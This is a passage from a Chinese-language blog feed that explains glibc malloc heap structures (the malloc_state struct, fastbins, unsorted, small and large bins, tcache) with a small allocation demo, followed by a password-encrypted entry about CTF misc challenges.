arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：<code>fastbin</code>，bins[]由三个容器：<code>unsorted bins</code>、<code>small bins</code>和<code>large bins</code>。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个<code>Tcache</code>机制，在这里就不展开了。</p></blockquote><h4 id="font-color-blue1fastbinsyfont"><a class="markdownIt-Anchor" href="#font-color-blue1fastbinsyfont"></a> <font color="blue"><code>1.FastbinsY[]</code></font></h4><p><code>fastbins</code></p><p>      该数组主要包含的是<code>fastbins</code>数据结构，它主要用于提高<strong>小内存</strong>的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回；</p><p>      我们也可以<strong>把fastbins看作为small bins的一个cache</strong>，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有：</p><ol><li>没有bk指针，也就是说它是一个单链表结构</li><li>prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并</li><li>采用LIFO （先进后出）策略</li></ol><p>      fastbins的结构如下图：</p><p><img src="/images/136-13.png" alt></p><center><font size="2">图13</font></center><h4 id="font-color-blue2binsfont"><a class="markdownIt-Anchor" href="#font-color-blue2binsfont"></a> <font color="blue"><code>2.Bins[]</code></font></h4><p>      该数组中存放的是<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code>，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为：</p><ul><li><code>bin[1]</code>：Unsorted bin</li><li><code>bin[2-63]</code>：small bins</li><li><code>bin[64-126]</code>：large bins</li></ul><p>      下图是三个bins的结构图：</p><p><img src="/images/136-15.png" alt></p><center><font size="2">图14</font></center><p><code>Unsorted bins</code></p><p>      Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，<strong>如果unsorted bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中</strong>，然后再在bin中分配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储unsorted bin的chunk链表头。</p><p><code>Small bins</code></p><p>      <code>ptmalloc</code>使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：<code>chunk_size = 2*size_sz*index</code>，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。</p><p><code>Large bins</code></p><p>      在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。</p><p><code>三个bin的大小对比</code></p><p>      如下图：</p><p><img src="/images/136-14.png" alt></p><center><font size="2">图15</font></center><p>      在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图：</p><p><img src="/images/136-16.png" alt></p><center><font size="2">图16</font></center><p>所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道<code>当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中</code>，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *c,*a,*b,*d,*e,*f,*g,*h,*i,*j;</span><br><span class="line">    <span class="keyword">char</span> *o;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 1</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 2</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 3 </span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 4</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 5</span></span><br><span class="line">f = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 6</span></span><br><span class="line">g = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 7</span></span><br><span class="line">h = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 8</span></span><br><span class="line">i = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 9</span></span><br><span class="line">j = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 10</span></span><br><span class="line">o = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 11</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">free</span>(f);</span><br><span class="line"><span class="built_in">free</span>(g);</span><br><span class="line"><span class="built_in">free</span>(h);</span><br><span class="line"><span class="built_in">free</span>(i);</span><br><span class="line"><span class="built_in">free</span>(j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图：</p></blockquote><p><img src="/images/136-17.png" alt></p><center><font size="2">图17</font></center><blockquote><p>有的同学可能会对上图产生疑问：<code>Unsorted bin明明只有1个chunk块，不是应该有3个吗？</code>是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是<code>0x140+0x140+0x140</code>的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了<code>Unlink</code>机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。</p><p>还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图：</p></blockquote><p><img src="/images/136-18.png" alt></p><center><font size="2">图18</font></center><blockquote><p>如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。<font color="red"><strong>注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变</strong>。</font></p></blockquote><h3 id="font-color-navy0x05-总结font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-总结font"></a> <font color="navy"><code>0x05 总结</code></font></h3><p>      有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！</p><h3 id="font-color-navy0x05-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-referencefont"></a> <font color="navy"><code>0x05 Reference</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/24753861?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=843456231229227008" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></p><p>[2] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p><p>[3] <a href="http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/" target="_blank" rel="noopener">进程分配内存的两种方式–brk() 和mmap()（不设计共享内存）</a></p><p>[4] <a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></p><p>[5] <a href="https://stackoverflow.com/questions/30542428/does-malloc-use-brk-or-mmap" target="_blank" rel="noopener">Does malloc() use brk() or mmap()?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-misc类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/12/2020.07.12%EF%BC%88135%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/12/2020.07.12（135）/</id>
    <published>2020-07-11T16:00:00.000Z</published>
    <updated>2020-07-25T03:10:50.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d4808b5bdac6aecdfac0c4ee04e40320e3d7d62044026298eab971ba5854aa80">c0b876c68ce8db4db0f2c5b16525afa2120afc55a2908d3322993c0be48c66eea98792901880c8466344c44217b8155245b9c97fbf56caeec538fba2091d2fb1d44e09e20b8cdbdee5be6350e1ed3a9ec590acbeffabf613ab20db6d5c1cb38b57ffc0ff870bd64a59d98382f942ba3212e7f7a5386a19166af01f12a34921daa0f3f6da3f96aea2bfac19fffc6650f573c5e9e7d7c215111b530660463f3bfabec4e27c4232e739ec05a738e8cee95d24780134dd31c6a366ca0cc82e18c9e5c87d52965fbe10fd5579b033df16f0acd7f02f5711f2a73bf56ff93fab2224a5404fc63eb0fd6fa525127b5486f3c221c47752020457ad08b22c4424191553667b97f515f47201f5b325e5ae36af9d830cc996d352c2e9807b009af628ada336576337d32a5a0a07a490c1820e59ffa3aa8a9ca27319188efd967ca8a67582b64ea9628a35280c65088f521629e399a3f62680b2beb3550df265af60538193222ed2deb595fdf842a46ccd6ece97b8869c29342ad243cd805350ff135e2d6d7ccd9e34cdddc1ca5c34139f048db62ae75ca268ad9efba9526a838ae863acaccb124e3f219283575958588b48507f9da915657e310226013170f9ed0003b8674fa9f326c36693ea57b1dfa57268d6858c80a56cd07d6ae8f6cb65fbe11b8730bbdb44ef12e6eb32e06a31aa543452b3d00e27b76541e210bcbe9486bcd0c01753a76782a0a4552878bf6279bdfcd254d2533e89bc2352f8b6027e6501a973e65781964c58be7e776c39e01aad805faef40226577b75df9285dadb98f88bcb5ab5ea71b9c54693e8f212c57a2f71f3eb1774577ccf9d2e65c3e1cbd64243a39a417506cca5e08632a1d375fbc8bca80c24e48ed272ac0c6adc9ac1e34be234519540865895d2067dcc2562e7b881fdd1923e4b1b2e6cd3e972a226423fa34534f9a19151d25cf4fd2f2e58020585d13f826614055f39d67ad4f907056c68cc6c2cba4c7a90f24965a5b940b130aa0bc793c8de0509a4a2beed27253f7e2f835c565879b422932bd4a871936626178daf9569242d79180cd45d3572c805867dd10ccf5fa66a23efb3dd609032f4389394f7935d5ad337461899e98e672a241aa457718c8645530a3db92706150c6e000f51df64c070e836ac4a27a19672a798c2451a0d2bcdcb64c70450875d96e4f8847edd69aea2d605385f624379011c8669693cf85ec44c6ae53ac4535f430a85e061304cd5d449af361dccbc9044d6781664e87aab78067113a88bfad750c63918ec460b06835a1fa60738b1818ad1e9e790a94c45fd89f8e2f13231fddc150eb61ea5ca58090142ddf86bc05b7185748b0bf939131fff34b6d70ba5fcb7dbb8d25b12a3b6a6ca5d22c86cd63ade4fb765591ba43fe42b250c4371e74e57389adba4297d1dbb855606e6be2124fbe0d53e7f424db5ca37c8c61d413f5ff9b5daf6fef0af6906256ebc3c648539b9b94cc11d0bc4cda758955cda10053fc923d1fd86259e6c3bb5367924ebfe8983e7191ff67379b418662a858070807f963fe6c6e4a2fa8cc5fa6088900eaaeb3f63ab031ae184154e1781a8601c59cb864fbdfeb5833b43b621268842133108e21aaacfa88462387187b9794f67443ccef38d30a41f794867b1b289a8096947b36c5281e6f861eabb0ce10578b69710fd28c19472d9ef1a7c59086c0658b566a9ba89c1e4778196e52d21af6d58f53bec1e858024932454556b2a2bc2e44a19e50af587cc7e71ffff766fd64cd6f1cc59d46c978d0ada0609a0ee1fb8952094d64567cb887336b3d696a3bd5703554db3befe697a61f38f92534fa2fb87a02ea3aa1441dbd495981c2dd8266a7d961ca92c10c25c3d8ae1288047e0c29914e55320cfd48e7369572e0116f31c84e9862a50e46dc390a35e25920de3f1d00e327da087ae547b0a1ac8c47ee5580ebba876e01036f07cc32a35b4010306096f876da41a8c7d9be239221587153d6b813b91b7ae0b83424e0469e7832110f6b3ab09a2268595e0f23303d52f1a5e92804b19bac1d8a80c81f12f4143b57e8a20436fc9534f46184268633fb12de2c98861e5b441aa78bc0b661c0242eba907257403488bc57d0a95cb485d011969bf051bcc896595d2bc661deb4eb0d3d1bda071db274fefecc276d96058981c152fafd6f457a4f0214c8ddefd12addbc8963c7500c3e824ca3a853bbe3979b53a5a5b5fa7583efb24268bf9627999cdec41c0ff55c500c134e44529b1f8d7a13c799f6be08d9ea26f5a09f076bc9b78cbb0e66997c7386d68a2b4110329833f3e47d247b5482facffc65526a680f46c9f0f0100fb632616d1ab41cbf6cc597587b619e591e25594661b2df57644a3183bda14f9df55175d3717f10ba4b8580fede394ece155f59b6e7caa057a8588e7d34ee3d901f5a42d27bd4990a4eefc0e4ef63a2976d8182d1fa0acd04901e223a772ffb24d4a50542d1eb5a0cead0f0aea48c7da58865de278a353c9dbc217cf6a268c2f032a17ea23b4e5c397c58d416c188e73b81c69e17234890ae4d13cc9f2576840a7825f6182cf31549e5a7873493df5bced8e32b2c38780bac7546b08fe925fbf647dc10afc5660e182d488663aa02f868a9fb4247e8a701c63f9f0125b68395736e969ac6bea844b8bcff43ce8f989d9ee50885c1cb1a01eb25ae70952f8e065528480897d1034cec516bc725d235bec8cdaf51fed1577747977434e4e78869bc64ddbbcb864a7009254754b7aac4dfaf2236a7554b4f9631eae7b9b1207f3af63372f9a735b2a1539b59980ee370902bf51b9877e41f886b2f5fbd59ebb40f894e51daea58ba5b829953f620a51536afdf3030437c804a51321909d2284eeb32391a782563aa12854a5f3485d3389f2bc712bd046db50959b404ae68a538bdf377c32a61f0f41b9d94ba67cdc6ab690e76719fe82b56f31ec4bfdd57785b72382c284460077159affab8259d98c56084a5277a914347ad501040fc24d9c87ddac472fae2ecb0ad80bbe3325410748c2b582917dacec39533c3e09e7e6f0ad35cc084d1029becfff8d6d9a676fc6f97a8a0b38daf1ded848a3c649c3ec62f0e78f2d1a225dd40eb0230f733eda044ad42a4fa83499ed8eb24ece4f88cd2a089988c8433e559508bde79759f4a1b4d9c17faea4590b4f95db545996f08cd631bf6e6b2b6984b1278947f40bac178b035363589c69e5ecb9f71bb03016052e73eef2db1f83c669b64851f69aeb2d46f8eea757d18f4c824c180f9f76d61d94b9630b8bcb7ca81184a9e37996af28d107aad06db4fe3b7af22c815ebd5315e0b9e3816dcefa40b2b6c0d996f1160879a33b19f780e20f50da19c8d70c03d12fe975950ff6b19378c0156801f995b200ac281367178941d935e25813f39595f7c26ac3e30de4cd41526ca8e574314d01872eae12e7b08f0f4a26e9db12c8ea2952f7e5e5e6fd16ab29766a70c8bf8b095ef32c24a2679037ed499535546a8a3be55b79eb84eabb95773f3f85514c2d7f786b0b9c7f530fa40d2767b256d1182ad906625315a666af493a24b1ce665654c97d7e7eff1271c657e9c2a73156921e9daa3777d7c63da4f9be2e12646dbca48c42dad41b0af4211da774e63073088a20e9dca40ec2ce0ebec932521f79cd125d48c5917febbe583db430494b792ff57b906f0fe412cd333738122ee0749ef42b731df7660d3015646506d6144b238fb3d519ae4e62f60c143e83155a8daaf202ee5c46a0e20bf46ee1e169958f33ae0805fe8e9efb1c5f86040c6978104dd85c2f1c36927d1bd4fb82472190c7d7f35bda89e6f46181724c651ff7f3c2624c51646ace66fc90e48d7c9255888158e7f01496fe732396c402f6886cb44697d083cea93c7ad171eb8aa192e9ec6d6db5b9057736ce9d26e49a350be78157a46c7ba62c166445397cb064f139e4f207281d7aaeb32b155382032e78c5f4a8554619e3f8652e30aded3beaced7c4c0c38a1bd74c688338f143b9d34e88af52735341ca58c8b264db061dbffbfd849e6a607db83ca94a85e753f3c5e1baf698c2940527b7008f33001567a0d411e079b61655d76de17e71bd78e40dff671cfb36465cff5329839b4495a3be3013d52f02de3d15a7a337d3dbb9fb7169f374d3c07554ff0699b9c599051583aeaf47ba9030f8b7116d7e299930e31663b09344d04c103f7c3c6389ede4def35ed42602e5ced47161e38bc40691bfb694bd82b12187445350bf8b47a78fe233d67289d6a86aa935eea114946a5facf5f489ac3478a1f4fb74a6cbde9b027d952274fdb3f892762a60ef80a4e8a6d7549721444b7cd401e365d8ad22c3cc740799f6822cf3fbd0f9e1cceb12557cceba1ee5c4f042768abcf7a0520d383618ff0b9ee8698638bbd47eed91fab6175cd4d6359df7fb7e4e80fe6815cd385007d726ec73ebbf3520543c9274f0d8833c92a638dc51e83b7765deb577c7a41f589a56e8f899e5c1aa4c12e6d4695902ff790cc27eab7f9f67c9019c8a3fdde309fabb580c532b27047b1c2a154f1b9dd60aa4e758782776a26d5379d1051f93650fd56d0b71e34a692d2c2da91bcf5c349c002297d9025895fdb9288236f36b18a9f27e2e66209037cf5753029d0d451edb5b7aa7ce487fb6387b16e2875f3c08fbe9051b6eb432afd4da58f872441b717dcb1a0485429d7d58613adebe05f4f4c6782d8492e4d10e721f5dbe37b4bbc5d8aa3ff665ff704e0d845be138fbe86c7806788b3e2f67996c35b9a862ca9623a0fd9b554e8714192163c7d4f7e5e3db518345919d7cc925aeaae19226e762c6eb59dd3c5dc1a802990843f085d215b5c5d523fcfd68d7895b40167dc2aaefa7eec4f068fb60d76992733f3d95d594ce3e034308e89d2b7776bdf3adea52a33c1ec1f85a87a0c00dbed26ee548216cbfa8ef34e1cf49f745e4d4780c7773aad8e2ffcff4baa80a639c4bc1035d663417c10388c0d77abe8bba9ff738e7c4cb216d31c924e2438ef42841efe4f6771e4a8b19a847e6944d900752344b821500fdc3592621263e63cd8ac866c15df16c4768a3b51a44c53eb6f5b6a2191dd70b9d1974cc886282e68c385442111d7ff9b970f5b60bb9a84b18c5f931194286d62b7e22aee6acbc34435d1f796191a9da609dc40535efe89503bbe16b0dafbc47ea706ebbe17bf748142b68c29b128b9d9cda6dcb89d748a5577ad24230f2e2d961ea354d8660d2233cf9092845674c9acd7e63e10afd1796fdf098f9b08ff1b920698dab2856efd603637b485a5053c6a5e314827a4757c33f6eb8a106bdd61e0dc77f684a9267f14138e5e8d841c6a8ec3b9bd5663ca53bb10cb8f8bd03815b1ec07d41ff3d478be5f8ae9cb73f60087be5c40cf3a00000ea2353212b2e120e9e8cd620518d323958f13d97029a82daaafdd97e581e7096f9076d06d7b7a3e7cf37c27f292894e25b1a131a6ad4ef780cc6672b3071176d0feb7a89ee47929dfddf4cc3908545d776d41eecd96fc8d2b05714b6c4063e75ad4b0da0d2a45585e3adad7f8842a0ac0b2c3e2fcea6c0b6df7d6eb64424e703e3132bf60e7c7531a0e8ea5055107abe9571ba81b5b6d67df2b515d2fa8cdc5ff17cfe3cc1f4bb711adc5de7073d3963211ee8a95bdb4718183fd672f6bbd24e51ad8bc32c469c2bd82f6c54e2dbd3a600525292c4349b146fef766272700d4869fe7f5a45f853ae1037c84e2afc7d6f47c6cc710fb13546537e80835ac296a419b1310e84a607974cc692b628a2b8cb7e859eb3eee610ab4ca6ea8a4bc6a019457dc4a347220547160384f33db52b512cd8645506fb5b5fdac2927541604202b8d08f2a0c567432ae718206161dff5a9919f2e66a837122e6bedd712de43e7d9620ea68e7e224d7240c6ac50d4d7602bfea7f7d460f5b48b21d9a2c536fbfe27af900ebeb80b4e1717fe08b083ee4c1f9244514e0f54391fa4448af14bd81be95afaf16f4f0cc749c5c5e9b830a549937ae610b86eed9582281391d32ca1677cf038bbab0b37489835be58639b9e684cd629a4c88426392515cf1010c34434b48ce48895bfc8b6da897916aedbe14bec14aa4b70a73c41c33706050e4fa5bd1d6c07847603f060bb3a4ac4a2dce2a2866343d8e9681432d28e59048255cdac0d1a12b881e04ff7ef59f1b3bd2cf84673921f1468fd481a7b06fd6fd053b1e60c6aae15d2132bbd33c76d0ffcda5518a784bd283927d9c3a328916b5c4eb9cbaa16cfa3f671237b80ada9943f5dc8b19b571a56bbcd517b3ee7466938607d5f8e4dad802c2cd40594d95a1f5ab793b7d2104b46e50c6595e31fe5f738be75e13447ee0e36bcc7dbf604d454d02e13165dd376dbde4fbe039d6a158fd2971336833591ef6fe21acca48283d227605d23e59ff3b7018e60529de68d8e03d9961acd8ad480b3cf7c2a8240961e9b5cbc5d9c22e2ce0ed5ad2539b79972a306a7771ebb0c50e73324676f77b1fd58da48334f77498e1d0b6f4233bfe95ce8a5d4015e97f957a9d12698bc5ed9970d44eae2d029733561e0299b8103a1f377d8c2043ae469f30b0b542bcee169cddf793eb2183e391fd7fef05d4cb54f2f73e5c73944fcb4ee35281473ddd1654c41dfc9e8eb5bad04655c35b1cc2bba3bef092c9cacd0fd61e704bef63238d2bb6a3c54c816be6651e00148989b4f5dae84619b9d536d8237cfda19e9d65653f16e116bd836ba8ab9809cd3e1f3673122fd196ed114e98ac8873c4c1659949ca136835476c4da7e4abbde04b848ebc8a1f7ddd75f19641ed99e5047fdd76ab0f8990f150f60d59257c6d90474f3a58e814356c06a4079340f05b1544a563ed05a6ba6484f31cb3a399a63168219b5d938fe65fdb1fa4b8ecabac707cd59001875f99d568ff707af1715c2f070b192285e7dd9c043cd80044ba6adc0c9fccc12429bd7afaf8d32dbd17b116bea2611c56765f11094c03106ff1e147b6217ea4284b412633485d1d21cda5c4f800f3cc6a43c9ac0066dae259620aed33bb2530b8c4e8ae926475d57205c60edb63210d544eb89510e4380dc932d64e12becf1102c95913003c2e75cb0578e34074bd3e7835fdb33153dc52b4883de7a786763f14203abbe197658a755e2edea8842780b21a3ce7121d23b25170b9bd25b8a676bbf1bc1cbcfe76cc586842586e98b964cdee80ffea1b442c6945673b809ed95f55c8c1d844fa6a34f2396234956f60a9be01ceec7799955134640802d1a8790b11b22fe745f08022a0a1bd765d1d38b75ee02ccb370c321ec9271771c77c22e2c4d7140886858e26314f54eaf301c83b7b04dc3f92af6b5a05351db37b68a0587b1e9ba08a31190090d16c5a4f496542dd69838324f199bad09fec94ac57d5d9669f12efcf9852fa442301091af8bb7f303d7ef3e749075d8ff0ad419d4a00a3fb2bd0d2f1c9482f669a86a066cf27379958ab6b45cd6eac00c616d3e9f72975f1fdbd57244788b144d7a7547fe13fa56aed1559e8136f959f0aedc99a046789d6cb01a183814cb71f7e17663a916017d866b26f588fab4f00ab864d67f0390d5d6a87d57b6d041a4ec78380992f43946502e49d02d5a8f9edc11526271b2029dbfc146d9b67aa2864c624a557323717c301363064a462a24ebfb03ec8eebccd7641bdcc803ef8299f6fd0a606b19799de59515bfe2c50a021370bfa1cf5885306b8303b4bc564f4cc21d82af7f762b24a59cc32dfb42680d9cf93157d6c0aeebaf4afbe2d72aebc135bf35afea40b9c4e4aec1a1a958a74fe99e528acdee887b4ed65ba75e8d6c9b2662789202f4576c3d4658db705a0219d9e3c78801929ce8eaf2045c821c6fd912f7aafe7a9016f0f9a56609ddc940f16f4542bb8888da8f5db2d2a05350bb70d5dcb6f76d9c294388157a6470878b31e7f9c2692143beccdf920f4d9cac4f1957dff6385af5fb63fb97b31c64cdfa61e6005e8d233e47c1a56e7a87fa57b51c8118cc1f8834330c1c56bef7cfc19d102476345150c40d806525ff3f05ca6ed68133ddacaea52885f7a490f7fb1443384b1ad469f9237dcb603a9e07e738c74fdb4f40254fefb12cde3f58c2943f9388ef04355bcca2d93007a7702de6453a5b62478ea32813140ca7e426d1084dd0359046fb1b593a9eb320b148b7ec5c19f8a6ae732c43414fcbbd7099d591ad91f2477862145e1eda1f5414dbe60adc5234e58aefb67f815b25bb9a5e9bfde1daf641a29e9f6f756da23337839e81520090ccfab7590227054d73b5dca0a0d4019f83278825cbb04fd879d6586f54e7b7991e1ef97648c51461fd6def785bb900cac9e1f12f5f991d3f76e018e38e7df9baef49ec6625d56e549756589020e8a0802fc72f1666350413d0c69592337624cfbbbf05ec4d5f2febe721ff238f0018ca703de1ac8e10185e117ac0f423b6e5b8c3b012d7dc5532f11ad7233abfadb7ba941a9835818250ab18be65687dd2ed30b41032dfcab5ed039d60d3ff339d5a278f87e13cd9b44aa39fcb754e280f306c503d2c58ffc2cf4462e4a72406f6cc5fed6b6d48536cfa5a909c7fd1455249d1c58640a69ee8efe46038f9347dba3fc21fd436a7c6d92209e3d495d9fc3d615d34ca91bc2676b7679093cff2b86fc0d8711238c74532a534773c691eb6834761a179249fdf81551c10b22f4b6a86db4931002aa9227ca7818b722d8d9e8a8679d61656656bc88a5ef9b93244f32f7de4a140f1b961ee9d95c53da5a6085e679b4b7eb83b68073ceafb01ffc4327239e4d7246a640b84d8391d42a302b4c9d9ed1790ffcad19ab6202779b63ba1bb03f86b6316c29568f65e4f5b6c68d7361845e12a0df8efacff32e13afa4d753449ed6c36faa4918341a31d6ca62894da3f315f9afbe50d17015054e1a2a3845c924ee8486985e87727bb02c90544a1219ff5460500875f2e36549b7e57209fb80d4389f9d0c23096f55a98285921c3a124aeeea04a3f333df38c195c5690b07fb484c367ac23b6bea8a1e3a3667d35c155808af2136a351e21c043e949cf6dc9dd9fc51ca92c6e988387ab58a2603c2ec0c4b5fdc0d9c2984201af251cd74e7f8097dceddb9bdac1aa3afd7744d87221fb0860ac743a9e42ecdc44dcc47cef2ecca9f41e8f3f92f4a423abd18808c776f126e0f498c7afb662d5972593f505c0de45a9eac5529f9648b82de2e8e3cf2722522c8430c560fb3b67a6c9383985a5cfa6e1639e0b02e202ec78d214a0dabc9bd4b21eb9b8de63a50e577fe1eaa61f1e4ca1495d7ca7a235527251fa6f75e1b83a1e619e88845b66f3f2d47ca632569c6f911b66f8b81c4ac2447b7d36b765651f0209d7b4f5369c215ad40ab21c5b8c34fc90b95ff67174e21f82b72946a73458c7d75a25b82c1bf638022b20576ae70ba86b5812a5f24dcdc8d68d358f4e48003e912f37c0a9014e3319646bc3515b4ada08a32aff05fb21106522087f0cf7b58c6c2ded960dec280fa806c05185fc8dabd9767a28377193418c0738c62d8444bdaa06a6c610e9181eed5f9cee418f58310b59462871df9c21a52a7a7c97ddb2de28364658bd029bbf170f233d16ac45b56361b9010ef848815c0f166efe80defdcb0a86be8694a8b7d7d933b393a8c42e338d710bddf87ea925e79065abfa538c3f35a0dee39bb51178d49720a38c0fb8977f1230619ea96ed59518115d91e7bb7f06acbe6cd1e0572954e571e28133b3f0db20a5952ff2bcc35001205119b847a11af1b82fcb8185d65c7d185f5946d24321224a50f50cc0215f5f69c89e729fa943fb290bbeae40e1bcd8923ff817253149733512b6ed9f4d465f180a0bfc0f5f90d6c6aff83179b57dc860766ba63aed663e8c6370ba61f943492eb135cee76abe9d7b029418191a39cc17774910a2d3d6e412ed8c83fae94050aadf949ba5c49ae7526d99a109b65efc35dc9b3073a6188f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
